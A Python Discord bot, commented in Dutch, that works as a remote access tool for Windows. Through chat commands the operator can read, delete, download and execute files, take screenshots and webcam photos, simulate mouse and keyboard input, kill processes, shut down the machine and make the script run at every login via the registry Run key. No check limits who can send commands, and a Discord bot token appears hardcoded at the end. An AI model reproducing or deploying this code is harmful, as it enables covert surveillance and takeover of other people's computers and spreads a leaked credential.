import discord
from discord.ext import commands
import os
import platform
import socket
import psutil
import subprocess
import time
import shutil
import requests
import webbrowser
import datetime
import winreg  # voor opstart toevoegen/verwijderen

# Voor muis en keyboard besturing
try:
    import pyautogui
except ImportError:
    pyautogui = None

# Voor webcam screenshot (vereist opencv-python)
try:
    import cv2
except ImportError:
    cv2 = None

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

DOWNLOADS_PATH = os.path.join(os.path.expanduser("~"), "Downloads")

# --- Helper functies ---

def get_sysinfo():
    uname = platform.uname()
    return (
        f"**Systeem info:**\n"
        f"OS: {uname.system} {uname.release}\n"
        f"Machine: {uname.machine}\n"
        f"Processor: {uname.processor}\n"
        f"Hostname: {socket.gethostname()}\n"
    )

def get_uptime():
    boot_time = psutil.boot_time()
    uptime_seconds = time.time() - boot_time
    return time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))

def get_cpu_usage():
    return psutil.cpu_percent(interval=1)

def get_ram_usage():
    ram = psutil.virtual_memory()
    return ram.percent

def get_disk_usage():
    disk = psutil.disk_usage('/')
    return disk.percent

def get_battery():
    if hasattr(psutil, "sensors_battery"):
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% {'(opladen)' if battery.power_plugged else '(op batterij)'}"
        else:
            return "Geen batterij gedetecteerd"
    else:
        return "Batterij info niet beschikbaar"

def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyDiscordBot", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        return "✅ Script is toegevoegd aan Windows startup."
    except Exception as e:
        return f"❌ Fout bij toevoegen aan startup: {e}"

def remove_from_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "MyDiscordBot")
        winreg.CloseKey(key)
        return "❌ Script verwijderd uit Windows startup."
    except FileNotFoundError:
        return "⚠️ Script stond niet in de opstartlijst."
    except Exception as e:
        return f"Fout bij verwijderen uit startup: {e}"

# --- Commands ---

@bot.command()
async def commands(ctx):
    embed = discord.Embed(title="📋 Beschikbare Commands", color=discord.Color.blue())
    embed.add_field(name="Systeem", value="!sysinfo, !uptime, !ip, !hostname", inline=False)
    embed.add_field(name="Systeembeheer", value="!shutdown, !restart, !sleep, !startup, !uninstall_startup", inline=False)
    embed.add_field(name="Bestandsbeheer", value="!ls, !read, !delete, !mkdir, !run, !runapp", inline=False)
    embed.add_field(name="Screenshot", value="!screenshot", inline=False)
    embed.add_field(name="Processen", value="!procs, !kill", inline=False)
    embed.add_field(name="Muis & Keyboard", value="!click, !move, !type", inline=False)
    embed.add_field(name="Statistieken", value="!cpu, !ram, !disk, !battery", inline=False)
    embed.add_field(name="Tools", value="!calc, !echo, !time", inline=False)
    embed.add_field(name="Webcam", value="!webcam, !livewebcam", inline=False)
    embed.add_field(name="Bestanden downloaden", value="!download <url>", inline=False)
    embed.add_field(name="Overig", value="!commands, !furryp", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def sysinfo(ctx):
    await ctx.send(get_sysinfo())

@bot.command()
async def uptime(ctx):
    await ctx.send(f"Systeem uptime: {get_uptime()}")

@bot.command()
async def ip(ctx):
    ip_addr = socket.gethostbyname(socket.gethostname())
    await ctx.send(f"IP adres: {ip_addr}")

@bot.command()
async def hostname(ctx):
    await ctx.send(f"Hostname: {socket.gethostname()}")

@bot.command()
async def ls(ctx, *, path="."):
    if not os.path.exists(path):
        await ctx.send(f"Pad bestaat niet: {path}")
        return
    files = os.listdir(path)
    if not files:
        await ctx.send(f"Map is leeg: {path}")
        return
    msg = "\n".join(files)
    await ctx.send(f"Inhoud van `{path}`:\n```\n{msg}\n```")

@bot.command()
async def read(ctx, *, filepath):
    if not os.path.isfile(filepath):
        await ctx.send(f"Bestand bestaat niet: {filepath}")
        return
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read(1500)
        await ctx.send(f"Inhoud van `{filepath}`:\n```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"Fout bij lezen bestand: {e}")

@bot.command()
async def delete(ctx, *, path):
    if not os.path.exists(path):
        await ctx.send(f"Bestand/map bestaat niet: {path}")
        return
    try:
        if os.path.isfile(path):
            os.remove(path)
            await ctx.send(f"Bestand verwijderd: {path}")
        else:
            shutil.rmtree(path)
            await ctx.send(f"Map verwijderd: {path}")
    except Exception as e:
        await ctx.send(f"Fout bij verwijderen: {e}")

@bot.command()
async def mkdir(ctx, *, path):
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"Map gemaakt of bestond al: {path}")
    except Exception as e:
        await ctx.send(f"Fout bij maken map: {e}")

@bot.command()
async def run(ctx, *, path):
    if not os.path.exists(path):
        await ctx.send(f"Bestand bestaat niet: {path}")
        return
    try:
        subprocess.Popen([path], shell=True)
        await ctx.send(f"Bestand gestart: {path}")
    except Exception as e:
        await ctx.send(f"Fout bij starten bestand: {e}")

@bot.command()
async def runapp(ctx, *, app_name):
    try:
        if platform.system() == "Windows":
            subprocess.Popen([app_name])
            await ctx.send(f"Applicatie gestart: {app_name}")
        else:
            await ctx.send("Deze command werkt alleen op Windows.")
    except Exception as e:
        await ctx.send(f"Fout bij starten van applicatie: {e}")

@bot.command()
async def download(ctx, url: str):
    try:
        filename = url.split("/")[-1].split("?")[0]
        filepath = os.path.join(DOWNLOADS_PATH, filename)
        r = requests.get(url)
        if r.status_code == 200:
            with open(filepath, "wb") as f:
                f.write(r.content)
            await ctx.send(f"Bestand gedownload naar {filepath}")
        else:
            await ctx.send(f"Kon bestand niet downloaden, status code: {r.status_code}")
    except Exception as e:
        await ctx.send(f"Fout bij downloaden: {e}")

@bot.command()
async def cpu(ctx):
    usage = get_cpu_usage()
    await ctx.send(f"CPU gebruik: {usage}%")

@bot.command()
async def ram(ctx):
    usage = get_ram_usage()
    await ctx.send(f"RAM gebruik: {usage}%")

@bot.command()
async def disk(ctx):
    usage = get_disk_usage()
    await ctx.send(f"Schijfruimte gebruik: {usage}%")

@bot.command()
async def battery(ctx):
    status = get_battery()
    await ctx.send(f"Batterij status: {status}")

@bot.command()
async def furryp(ctx):
    for _ in range(25):
        webbrowser.open_new_tab("https://www.google.com")
    await bot.change_presence(activity=discord.Game(name="Jonkler 🤡 speelt"))
    await ctx.send("Jonkler 🤡 speelt nu! 25 tabbladen geopend.")

@bot.command()
async def procs(ctx):
    procs = []
    for proc in psutil.process_iter(['pid', 'name']):
        procs.append(f"{proc.info['pid']}: {proc.info['name']}")
    msg = "\n".join(procs[:50])
    await ctx.send(f"Lopende processen:\n```\n{msg}\n```")

@bot.command()
async def kill(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        p.terminate()
        await ctx.send(f"Proces {pid} beëindigd.")
    except Exception as e:
        await ctx.send(f"Kon proces niet beëindigen: {e}")

@bot.command()
async def screenshot(ctx):
    try:
        if pyautogui is None:
            await ctx.send("Screenshot functie vereist pyautogui module.")
            return
        image = pyautogui.screenshot()
        path = os.path.join(DOWNLOADS_PATH, "screenshot.png")
        image.save(path)
        await ctx.send(file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(f"Fout bij screenshot maken: {e}")

@bot.command()
async def click(ctx, x: int, y: int):
    if pyautogui is None:
        await ctx.send("Muis functie vereist pyautogui module.")
        return
    try:
        pyautogui.click(x, y)
        await ctx.send(f"Geklikt op positie ({x}, {y})")
    except Exception as e:
        await ctx.send(f"Fout bij klikken: {e}")

@bot.command()
async def move(ctx, x: int, y: int):
    if pyautogui is None:
        await ctx.send("Muis functie vereist pyautogui module.")
        return
    try:
        pyautogui.moveTo(x, y)
        await ctx.send(f"Muis bewogen naar ({x}, {y})")
    except Exception as e:
        await ctx.send(f"Fout bij muis bewegen: {e}")

@bot.command()
async def type(ctx, *, text):
    if pyautogui is None:
        await ctx.send("Keyboard functie vereist pyautogui module.")
        return
    try:
        pyautogui.write(text)
        await ctx.send(f"Getypt: {text}")
    except Exception as e:
        await ctx.send(f"Fout bij typen: {e}")

@bot.command()
async def calc(ctx, *, expression):
    try:
        allowed_chars = "0123456789+-*/(). "
        if any(c not in allowed_chars for c in expression):
            await ctx.send("Ongeldige karakters in expressie.")
            return
        result = eval(expression)
        await ctx.send(f"Resultaat: {result}")
    except Exception as e:
        await ctx.send(f"Fout bij berekenen: {e}")

@bot.command()
async def echo(ctx, *, message):
    await ctx.send(message)

@bot.command()
async def time(ctx):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    await ctx.send(f"Huidige tijd: {now}")

@bot.command()
async def webcam(ctx):
    if cv2 is None:
        await ctx.send("Webcam functie vereist OpenCV (cv2) module.")
        return
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if ret:
            img_path = os.path.join(DOWNLOADS_PATH, "webcam.jpg")
            cv2.imwrite(img_path, frame)
            await ctx.send(file=discord.File(img_path))
            os.remove(img_path)
        else:
            await ctx.send("Kon geen webcam foto maken.")
    except Exception as e:
        await ctx.send(f"Fout bij webcam foto: {e}")

@bot.command()
async def livewebcam(ctx):
    await ctx.send("Live webcam is nog niet geïmplementeerd.")

@bot.command()
async def startup(ctx):
    if platform.system() != "Windows":
        await ctx.send("Deze functie werkt alleen op Windows.")
        return
    result = add_to_startup()
    await ctx.send(result)

@bot.command()
async def uninstall_startup(ctx):
    if platform.system() != "Windows":
        await ctx.send("Deze functie werkt alleen op Windows.")
        return
    result = remove_from_startup()
    await ctx.send(result)

@bot.command()
async def shutdown(ctx):
    try:
        if platform.system() == "Windows":
            subprocess.run("shutdown /s /t 1", shell=True)
        elif platform.system() == "Linux":
            subprocess.run("shutdown now", shell=True)
        else:
            await ctx.send("Shutdown command niet ondersteund op dit systeem.")
            return
        await ctx.send("Systeem wordt afgesloten...")
    except Exception as e:
        await ctx.send(f"Fout bij shutdown: {e}")

@bot.command()
async def restart(ctx):
    try:
        if platform.system() == "Windows":
            subprocess.run("shutdown /r /t 1", shell=True)
        elif platform.system() == "Linux":
            subprocess.run("reboot", shell=True)
        else:
            await ctx.send("Restart command niet ondersteund op dit systeem.")
            return
        await ctx.send("Systeem wordt herstart...")
    except Exception as e:
        await ctx.send(f"Fout bij restart: {e}")

@bot.command()
async def sleep(ctx):
    try:
        if platform.system() == "Windows":
            subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
        elif platform.system() == "Linux":
            subprocess.run("systemctl suspend", shell=True)
        else:
            await ctx.send("Sleep command niet ondersteund op dit systeem.")
            return
        await ctx.send("Systeem gaat in slaapstand...")
    except Exception as e:
        await ctx.send(f"Fout bij sleep: {e}")

# Foutafhandeling
@bot.event
async def on_command_error(ctx, error):
    from discord.ext.commands import CommandNotFound
    if isinstance(error, CommandNotFound):
        await ctx.send("Die command ken ik niet, typ !commands voor alle commands.")
    else:
        await ctx.send(f"Er is een fout opgetreden: {error}")

# 🟢 Start de bot
bot.run('MTM4NDExOTU5ODg1MjM0MTkwMA.GncXnw.Ov8WOlf-hE6_8wFDrFdH5s77fsQxL6slKlPVxI')  # <-- vervang met je echte Discord token
